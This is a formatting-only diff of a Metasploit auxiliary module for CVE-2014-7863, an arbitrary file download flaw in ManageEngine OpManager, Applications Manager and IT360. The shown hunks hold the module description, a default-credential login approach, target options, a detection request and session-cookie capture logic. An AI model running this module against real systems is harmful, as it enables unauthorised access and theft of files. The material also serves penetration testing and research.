@@ -7,34 +7,36 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => "ManageEngine Multiple Products Arbitrary File Download",
-      'Description'    => %q{
-        This module exploits an arbitrary file download vulnerability in the FailOverHelperServlet
-        on ManageEngine OpManager, Applications Manager and IT360. This vulnerability is
-        unauthenticated on OpManager and Applications Manager, but authenticated in IT360. This
-        module will attempt to login using the default credentials for the administrator and
-        guest accounts; alternatively you can provide a pre-authenticated cookie or a username
-        and password combo. For IT360 targets enter the RPORT of the OpManager instance (usually
-        8300). This module has been tested on both Windows and Linux with several different
-        versions. Windows paths have to be escaped with 4 backslashes on the command line. There is
-        a companion module that allows the recursive listing of any directory. This
-        vulnerability has been fixed in Applications Manager v11.9 b11912 and OpManager 11.6.
-      },
-      'Author'       =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => "ManageEngine Multiple Products Arbitrary File Download",
+        'Description' => %q{
+          This module exploits an arbitrary file download vulnerability in the FailOverHelperServlet
+          on ManageEngine OpManager, Applications Manager and IT360. This vulnerability is
+          unauthenticated on OpManager and Applications Manager, but authenticated in IT360. This
+          module will attempt to login using the default credentials for the administrator and
+          guest accounts; alternatively you can provide a pre-authenticated cookie or a username
+          and password combo. For IT360 targets enter the RPORT of the OpManager instance (usually
+          8300). This module has been tested on both Windows and Linux with several different
+          versions. Windows paths have to be escaped with 4 backslashes on the command line. There is
+          a companion module that allows the recursive listing of any directory. This
+          vulnerability has been fixed in Applications Manager v11.9 b11912 and OpManager 11.6.
+        },
+        'Author' => [
           'Pedro Ribeiro <pedrib[at]gmail.com>', # Vulnerability Discovery and Metasploit module
         ],
-      'License'     => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           ['CVE', '2014-7863'],
           ['OSVDB', '117695'],
           ['URL', 'https://seclists.org/fulldisclosure/2015/Jan/114'],
           ['URL', 'https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_failservlet.txt']
         ],
-      'DisclosureDate' => '2015-01-28'))
+        'DisclosureDate' => '2015-01-28'
+      )
+    )
 
     register_options(
       [
@@ -45,7 +47,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('USERNAME', [false, 'The username to login as (IT360 target only)']),
         OptString.new('PASSWORD', [false, 'Password for the specified username (IT360 target only)']),
         OptString.new('DOMAIN_NAME', [false, 'Name of the domain to logon to (IT360 target only)'])
-      ])
+      ]
+    )
   end
 
   def post_auth?
@@ -68,7 +71,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def detect_it360
     res = send_request_cgi({
-      'uri'    => '/',
+      'uri' => '/',
       'method' => 'GET'
     })
 
@@ -120,7 +123,7 @@ class MetasploitModule < Msf::Auxiliary
         'timestamp' => Time.now.to_i
       },
       'vars_post' => vars_post
-      })
+    })
 
     if res && res.get_cookies.to_s =~ /IAMAGENTTICKET([A-Z]{0,4})=([\w]{9,})/
       # /IAMAGENTTICKET([A-Z]{0,4})=([\w]{9,})/ -> this pattern is to avoid matching "removed"
